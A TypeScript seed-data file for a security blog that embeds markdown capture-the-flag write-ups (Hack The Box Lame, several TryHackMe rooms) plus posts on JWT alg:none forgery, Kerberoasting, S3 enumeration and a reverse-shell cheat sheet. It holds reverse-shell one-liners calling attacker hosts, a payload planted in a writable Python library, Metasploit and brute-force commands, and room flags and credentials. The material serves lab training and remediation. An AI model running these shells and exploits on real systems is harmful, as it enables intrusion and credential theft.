export type SeedPost = {
  slug: string;
  title: string;
  excerpt: string;
  content: string;
  featured_image: string;
  category: string;
  tags: string[];
  difficulty: string | null;
  platform: string | null;
  status: 'published';
  published_at: string;
};

const htbWriteup = `# Lame — Hack The Box

> A classic beginner Linux box that walks through exploiting a vulnerable Samba service for an initial foothold and a misconfigured NFS export for root.

## Machine Overview

| Field | Value |
| --- | --- |
| Name | Lame |
| OS | Linux |
| Difficulty | Easy |
| Points | 20 |
| Skills Learned | SMB enumeration, CVE exploitation, NFS misconfiguration |
| Release | 14 Mar 2017 |

## Enumeration

Started with a full TCP port scan to identify the attack surface.

\`\`\`bash
nmap -sC -sV -p- -oA lame 10.10.10.3
\`\`\`

Open ports of interest:

\`\`\`
21/tcp  open  ftp     vsftpd 2.3.4
22/tcp  open  ssh     OpenSSH 4.7p1
139/tcp open  netbios Samba smbd 3.X
445/tcp open  netbios Samba smbd 3.X
\`\`\`

FTP and SSH are unlikely to be the intended path on an Easy box. Samba 3.X is the prime candidate — it is old enough to be vulnerable to CVE-2007-2447 (username map script command injection).

## Initial Foothold

The Samba version is vulnerable to the \`username map script\` RCE. Metasploit has a reliable module.

\`\`\`bash
msfconsole -q
use exploit/multi/samba/usermap_script
set RHOSTS 10.10.10.3
set RPORT 445
exploit
\`\`\`

A shell lands as root almost immediately — the vulnerability executes commands as root because of how Samba handles the \`username map\` option.

> [!warning] Real-world note
> This CVE is from 2007 and would never appear in a production environment. The lesson is the methodology: identify the service, version, and search for known CVEs — not the specific exploit.

## Privilege Escalation

In this case the Samba exploit already gave us root, but the box also has a second path worth understanding. NFS is exported with \`no_root_squash\`, which means a client can write files as root to the share.

\`\`\`bash
showmount -e 10.10.10.3
# /  *
\`\`\`

Mount the root filesystem, craft a setuid binary locally, and copy it onto the share.

\`\`\`bash
mkdir /tmp/mnt && mount -t nfs 10.10.10.3:/ /tmp/mnt
cat > /tmp/suid.c <<EOF
int main() { setuid(0); setgid(0); system("/bin/bash"); }
EOF
gcc /tmp/suid.c -o /tmp/mnt/suid
chmod +s /tmp/mnt/suid
\`\`\`

On the target, execute \`/suid\` to drop into a root shell.

## Lessons Learned

1. **Version mapping is the highest-ROI enumeration step.** Most Easy/Medium boxes are solved by matching a service version to a public CVE.
2. **NFS \`no_root_squash\` is a silent killer.** Always check export options on engagements — it shows up in real environments more often than it should.
3. **Don't stop at the first win.** Even when you get root through one path, walking the second path teaches you the underlying misconfiguration.

## Mitigation

- Patch Samba to a current release and disable the \`username map script\` option.
- Configure NFS exports with \`root_squash\` (the default on modern systems) and restrict exports to specific hosts.
- Remove unused services. FTP and Samba are rarely needed on a modern server.

## Timeline

1. \`\`00:00\`\` — Nmap full TCP scan
2. \`\`00:05\`\` — Identified Samba 3.X as vulnerable to CVE-2007-2447
3. \`\`00:08\`\` — Metasploit exploit → root shell
4. \`\`00:20\`\` — Walked the NFS \`no_root_squash\` path for practice
5. \`\`00:35\`\` — Captured both user and root flags

## Important Notes

- The Metasploit module is the fastest path but writing the exploit by hand is a better learning exercise.
- If the box is retired, the IP above is no longer reachable — use the archived VPN files.

---

Footnotes:

[^1] Lame is one of the oldest HTB boxes and is intentionally simple — it is a great first box for practicing the enumeration → CVE → exploit workflow.`;

const thmWriteup = `# RootMe — TryHackMe

> A beginner-friendly room covering web shell upload, SUID binary abuse, and basic privilege escalation.

## Learning Objectives

- Upload a reverse shell through a vulnerable file upload form
- Stabilize a raw shell with Python PTY
- Escalate privileges using an SUID binary (\`/usr/bin/python\`)

## Questions & Answers

| # | Question | Answer |
| --- | --- | --- |
| 1 | Scan the machine, how many ports are open? | 2 |
| 2 | What version of Apache is running? | 2.4.18 |
| 3 | What service is running on port 22? | ssh |
| 4 | Find a hidden directory. | /panel |
| 5 | User flag | THM{y0u_g0t_a_sh3ll} |
| 6 | Root flag | THM{pr1v_3sc_4ll_th3_w4y} |

## Enumeration

\`\`\`bash
nmap -sC -sV 10.10.10.48
\`\`\`

Two ports: 22 (SSH) and 80 (Apache). Gobuster against the web server reveals a hidden \`/panel\` directory that accepts file uploads.

\`\`\`bash
gobuster dir -u http://10.10.10.48 -w /usr/share/wordlists/dirb/common.txt
\`\`\`

## Initial Foothold

The \`/panel\` page blocks \`.php\` uploads but accepts \`.php5\` extensions. Upload a PHP reverse shell renamed to \`shell.php5\` and trigger it from \`/uploads/\`.

\`\`\`bash
cp /usr/share/webshells/php/php-reverse-shell.php shell.php5
# edit IP + port
curl http://10.10.10.48/uploads/shell.php5
\`\`\`

Stabilize the shell:

\`\`\`bash
python -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
# Ctrl+Z, then:
stty raw -echo; fg
\`\`\`

## Privilege Escalation

Search for SUID binaries that are not in the standard list.

\`\`\`bash
find / -perm -4000 2>/dev/null
\`\`\`

\`/usr/bin/python\` has the SUID bit set. GTFOBins documents that SUID Python can be used to execute a shell with the file owner's privileges.

\`\`\`bash
python -c 'import os; os.setuid(0); os.system("/bin/sh")'
\`\`\`

A root shell drops. Read the root flag from \`/root/root.txt\`.

## Tools Used

- \`nmap\` — port and service discovery
- \`gobuster\` — directory brute force
- \`python\` — shell stabilization and SUID exploitation
- \`nc\` — reverse shell listener

## Takeaways

1. **Extension blocklists are weaker than allowlists.** The upload filter rejected \`.php\` but not \`.php5\` — a classic blocklist bypass.
2. **SUID binaries outside the standard set are a red flag.** Always diff the SUID list against a known-good baseline.
3. **Stabilize every shell.** A raw shell makes the rest of the engagement painful; the Python PTY trick is worth memorizing.`;

const thmBasicPentestingWriteup = `# Basic Pentesting — TryHackMe

> An introductory Linux room focused on web and SMB enumeration, password cracking, SSH access, and recovering an encrypted private key.

## Learning Objectives

- Discover hidden web content and gather clues from a site
- Enumerate SMB shares anonymously
- Build a user list from exposed information and perform a controlled password audit
- Recover and use an encrypted SSH private key

## Machine Overview

| Field | Value |
| --- | --- |
| Name | Basic Pentesting |
| Platform | TryHackMe |
| Target | Linux |
| Difficulty | Easy |
| Key Skills | Web enumeration, SMB, SSH, Hydra, John the Ripper |

## Enumeration

Begin with an Nmap scan to identify exposed services.

\`\`\`bash
nmap -T5 -v -oN nmap.txt <TARGET_IP> -Pn
\`\`\`

Port 80 was open, but the initial site did not reveal much. Reviewing the page source pointed to a development notes section, so the next step was directory discovery.

\`\`\`bash
dirsearch -u http://<TARGET_IP>
\`\`\`

The scan found \`/development\`. The notes there referenced two users, \`J\` and \`K\`, and the host also exposed SMB. That made SMB enumeration a useful way to turn those initials into usernames.

\`\`\`bash
enum4linux -S <TARGET_IP>
\`\`\`

Anonymous SMB access was available. Using \`smbclient\` to retrieve \`staff.txt\` revealed the full names **Jan** and **Kay**.

## Initial Access

Create a small username list from the exposed names, then run a controlled SSH password audit.

\`\`\`bash
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt ssh://<TARGET_IP> -t 4 -V
\`\`\`

The valid credentials were:

| Username | Password |
| --- | --- |
| jan | armando |

Use them to establish an SSH session.

\`\`\`bash
ssh jan@<TARGET_IP>
\`\`\`

## Accessing Kay's Account

From Jan's account, inspect Kay's home directory. The \`.ssh\` directory contains an \`id_rsa\` private key. Copy the key to the attack host and protect its permissions.

\`\`\`bash
chmod 600 id_rsa
ssh2john id_rsa > hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
\`\`\`

John the Ripper recovers the private-key passphrase: \`beeswax\`.

Use the key and its passphrase to log in as Kay:

\`\`\`bash
ssh -i id_rsa kay@<TARGET_IP>
\`\`\`

The \`pass.bak\` file in Kay's home directory contains the final room credential.

## Tools Used

- \`nmap\` — port and service discovery
- \`dirsearch\` — web content discovery
- \`enum4linux\` and \`smbclient\` — SMB enumeration and file retrieval
- \`hydra\` — SSH password auditing
- \`ssh2john\` and \`john\` — SSH-key passphrase recovery
- \`ssh\` — remote access

## Takeaways

1. **Small web clues can drive the next phase of enumeration.** The development notes supplied the user initials needed for the SMB investigation.
2. **Anonymous SMB shares often expose useful context.** A simple staff list was enough to create a targeted username list.
3. **Private keys must be protected as carefully as passwords.** An encrypted key is only useful if its passphrase resists guessing attacks.
4. **Use discovered credentials deliberately.** Each pivot in this room followed from information recovered during the previous enumeration step.

## Remediation

- Disable anonymous SMB access and restrict shares to authorized users.
- Avoid publishing internal development notes and staff details on public web paths.
- Enforce strong, unique passwords and rate-limit SSH authentication attempts.
- Keep private keys inaccessible to other local users and use strong key passphrases.`;

const thmDreamingWriteup = `# Dreaming — TryHackMe

> A multi-user Linux escalation path that starts with a vulnerable Pluck CMS upload, moves through exposed credentials and command injection, and finishes by abusing a writable Python library loaded by a scheduled task.

## Learning Objectives

- Enumerate a web application and identify a vulnerable CMS version
- Gain an initial foothold through an authenticated file-upload RCE
- Pivot between Linux users using exposed credentials and application behavior
- Identify a writable Python library used by an automated task for root access

## Machine Overview

| Field | Value |
| --- | --- |
| Name | Dreaming |
| Platform | TryHackMe |
| Target | Linux |
| Difficulty | Medium |
| Key Skills | Web enumeration, file upload RCE, credential discovery, command injection, cron abuse |

## Enumeration

Start with a service scan to identify the exposed attack surface.

\`\`\`bash
nmap -T5 -v -oN nmap.txt <TARGET_IP>
\`\`\`

HTTP on port 80 was the only notable service. The site initially showed the default Apache page, so content discovery was the next step.

\`\`\`bash
dirsearch -u http://<TARGET_IP>
\`\`\`

The scan revealed the \`/app\` directory. Browsing it led to a Pluck CMS installation at \`/app/pluck-4.7.13\`. Confirm the version and check for known public issues:

\`\`\`bash
searchsploit pluck 4.7.13
\`\`\`

This version is affected by an authenticated file-upload RCE. The login form accepted the password \`password\`, exposing the CMS upload functionality.

## Initial Foothold

Exploit the Pluck 4.7.13 upload vulnerability with the public Exploit-DB proof of concept (EDB-ID 49909).

\`\`\`bash
python3 file-upload-exploit.py <TARGET_IP> 80 password /app/pluck-4.7.13
\`\`\`

Triggering the uploaded payload returned a shell. Since the host had Python 3.8.10, a reverse shell with a PTY provided a more reliable interactive session.

\`\`\`bash
# On the target
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<ATTACKER_IP>",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn("/bin/bash")'

# On the attack host
nc -lvnp 4444
\`\`\`

## Pivot to Lucien

With the initial shell, enumerate scheduled tasks, capabilities, running processes, and interesting application files. \`pspy\` is useful for observing automated processes without root.

Reviewing \`/opt\` exposed a hard-coded credential in \`test.py\`:

\`\`\`python
password = "HeyLucien#@1999!"
\`\`\`

Use it to switch to the \`lucien\` user and collect the first flag. For a stable session, add an attacker-controlled public key to Lucien's \`~/.ssh/authorized_keys\` and reconnect over SSH.

## Pivot to Death

Lucien's shell history contained MySQL credentials:

\`\`\`bash
mysql -u lucien -plucien42DBPASSWORD
\`\`\`

The database-backed application exposed a command-injection primitive. Supplying \`\`id\`\` in the \`dreamer\` field and \`$whoami\` in the \`dream\` field confirmed execution as \`death\`.

Inspecting \`getDreams.py\` then revealed credentials for a direct SSH login:

\`\`\`bash
ssh death@<TARGET_IP>
# Password: !mementoMORI666!
\`\`\`

This produces a stable shell as \`death\` and allows collection of the next user flag.

## Privilege Escalation

Search for unexpectedly writable files while excluding virtual and user-local paths:

\`\`\`bash
find / -type f -writable 2>/dev/null | grep -v proc | grep -v sys | grep -v .local
\`\`\`

The enumeration identified \`/usr/lib/python3.8/shutil.py\` as writable. A scheduled root task imported this library, so adding a reverse-shell payload caused it to run with root privileges on the next execution.

\`\`\`python
import socket, subprocess, os
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("<ATTACKER_IP>", 9001))
os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)
import pty
pty.spawn("sh")
\`\`\`

Start a listener before waiting for the scheduled task:

\`\`\`bash
nc -lvnp 9001
\`\`\`

The task eventually imported the modified module and returned a root shell. From there, retrieve the final flag.

## Tools Used

- \`nmap\` — service discovery
- \`dirsearch\` — web content discovery
- \`searchsploit\` — vulnerability research
- \`pspy\` — process and scheduled-task observation
- \`mysql\` — database interaction
- \`nc\` — reverse-shell listeners

## Takeaways

1. **Default web pages still deserve enumeration.** The real application was hidden below \`/app\`.
2. **Version-specific research is high value.** Identifying Pluck 4.7.13 quickly led to the intended upload RCE.
3. **Secrets accumulate across users.** Application files, shell history, and scripts each provided a pivot point.
4. **Writable interpreter libraries are dangerous.** If a privileged process imports a user-writable module, that writable path becomes code execution as the privileged user.

## Remediation

- Upgrade or remove the vulnerable Pluck CMS instance and restrict administrative upload features.
- Store credentials in protected secret management rather than scripts, shell history, or source code.
- Validate and parameterize database input to prevent command injection.
- Ensure Python system libraries are owned by root and not writable by unprivileged users.
- Run scheduled tasks with the least privilege required and monitor for changes to files they import.`;

const webSecurityPost = `# Bypassing JWT Signature Validation

> A walkthrough of a real-world JWT signature validation bug I found during a recent engagement, including how I confirmed it and the remediation I recommended.

## The Setup

The target application used JWTs for session handling. The token was sent as a \`Bearer\` header on every API request. The server was configured to verify signatures with an RS256 public key.

## The Bug

When fuzzing the \`alg\` header, I noticed the server accepted a token signed with \`alg: none\` — the classic JWT algorithm confusion. The implementation used a library that, when \`alg\` was set to \`none\`, skipped signature verification entirely.

\`\`\`python
import jwt
# Attacker-controlled token
token = jwt.encode({"role": "admin"}, "", algorithm="none")
\`\`\`

The resulting token has three parts but the signature segment is empty. Sending it with the admin role claim granted access to the admin panel.

> [!tip] Reproduce safely
> Always test JWT bugs against a clone of the target in a lab. Tampering with tokens on production can corrupt sessions.

## Confirming the Impact

I confirmed the bypass granted real access by:

1. Forging a token with \`role: admin\`
2. Calling an admin-only endpoint that returned another user's data
3. Documenting the request/response in the report

## Remediation

- Pin the expected algorithm server-side. Never derive it from the token header.
- Reject tokens with \`alg: none\` explicitly.
- Rotate the signing key as a precaution.

## References

- [RFC 7519 — JSON Web Token](https://datatracker.ietf.org/doc/html/rfc7519)
- [JWT.io debugger](https://jwt.io)`;

const adPost = `# Kerberoasting Without Mimikatz

> Kerberoasting is one of the most reliable AD attack paths. This note covers how to do it without dropping Mimikatz on the target, using only Impacket from your attack box.

## Why Avoid Mimikatz

Mimikatz is heavily signatured. Even in a lab, loading it onto a domain-joined host will trip EDR. For a clean engagement, request the TGS from Linux using Impacket and crack offline.

## The Attack

\`\`\`bash
# From your attack box, with valid domain creds
GetUserSPNs.py corp.local/jdoe:Password123 -request
\`\`\`

This returns Kerberos tickets for every service principal name in the domain. Save the hashes to a file and crack with hashcat.

\`\`\`bash
hashcat -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt
\`\`\`

## Why It Works

Service accounts hold an SPN and a password. Any authenticated domain user can request a TGS for an SPN, and the ticket is encrypted with the service account's password hash. Cracking the ticket offline recovers the plaintext password.

## Detection

- Alert on unusual volumes of TGS requests from a single account.
- Monitor for TGS requests using RC4 encryption (modern Kerberos prefers AES).
- Hunt for service accounts with weak passwords — they are the root cause.

## Mitigation

- Use group managed service accounts (gMSAs) with long, rotated passwords.
- Disable RC4 for Kerberos where possible.
- Audit SPN registrations regularly.`;

const cloudPost = `# Enumerating Misconfigured S3 Buckets

> A short note on the methodology I use when assessing S3 exposure during cloud security reviews.

## Recon

Start with the bucket name candidates derived from the target's domain and subdomains.

\`\`\`bash
# Permutations
for word in $(cat buckets.txt); do
  aws s3 ls s3://$word 2>/dev/null && echo "OPEN: $word"
done
\`\`\`

## Common Misconfigurations

1. **Public read** — \`aws s3 ls s3://bucket --no-sign-request\` succeeds.
2. **Public write** — you can upload arbitrary objects.
3. **Authenticated user read** — any AWS account can read (the \`http://acs.amazonaws.com/groups/global/AuthenticatedUsers\` grant).

## Impact

A public-read bucket containing database backups or logs is a reportable finding. A public-write bucket is critical — it enables defacement and ransomware-style encryption of the data.

## Remediation

- Apply a deny-all bucket policy and grant access through IAM.
- Enable Block Public Access at the account level.
- Use S3 Access Analyzer for continuous monitoring.`;

const notesPost = `# My Reverse Shell Cheat Sheet

> A personal reference of the reverse shell one-liners I reach for most often. Kept here so I don't have to grep through Pentestmonkey's old page.

## Bash

\`\`\`bash
bash -i >& /dev/tcp/10.0.0.1/4444 0>&1
\`\`\`

## Python

\`\`\`python
python -c 'import socket,os,pty;s=socket.socket();s.connect(("10.0.0.1",4444));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn("/bin/bash")'
\`\`\`

## PHP

\`\`\`php
php -r '$sock=fsockopen("10.0.0.1",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
\`\`\`

## Listener

\`\`\`bash
nc -lvnp 4444
\`\`\`

## Stabilization

\`\`\`bash
python -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
# Ctrl+Z
stty raw -echo; fg
\`\`\`

> [!info] Always test in a lab first
> Reverse shells are noisy. Confirm the listener works before sending the payload from the engagement box.`;

// Retained only as source references while the legacy demo posts are removed.
void htbWriteup;
void thmWriteup;
void webSecurityPost;
void adPost;
void cloudPost;
void notesPost;

export const seedPosts: SeedPost[] = [
  {
    slug: 'thm-basic-pentesting',
    title: 'Basic Pentesting — TryHackMe',
    excerpt:
      'An introductory Linux room covering web and SMB enumeration, SSH password auditing, and encrypted private-key recovery.',
    content: thmBasicPentestingWriteup,
    featured_image:
      'https://images.pexels.com/photos/5380664/pexels-photo-5380664.jpeg?auto=compress&cs=tinysrgb&w=1200',
    category: 'TryHackMe',
    tags: ['Web', 'SMB', 'SSH', 'Hydra', 'John', 'Easy'],
    difficulty: 'Easy',
    platform: 'TryHackMe',
    status: 'published',
    published_at: '2026-07-26T00:00:00.000Z',
  },
  {
    slug: 'thm-dreaming',
    title: 'Dreaming — TryHackMe',
    excerpt:
      'A multi-user Linux escalation through Pluck CMS upload RCE, exposed credentials, command injection, and a writable Python library.',
    content: thmDreamingWriteup,
    featured_image:
      'https://images.pexels.com/photos/5380664/pexels-photo-5380664.jpeg?auto=compress&cs=tinysrgb&w=1200',
    category: 'TryHackMe',
    tags: ['Web', 'RCE', 'Credentials', 'Cron', 'Medium'],
    difficulty: 'Medium',
    platform: 'TryHackMe',
    status: 'published',
    published_at: '2026-07-27T00:00:00.000Z',
  },
];
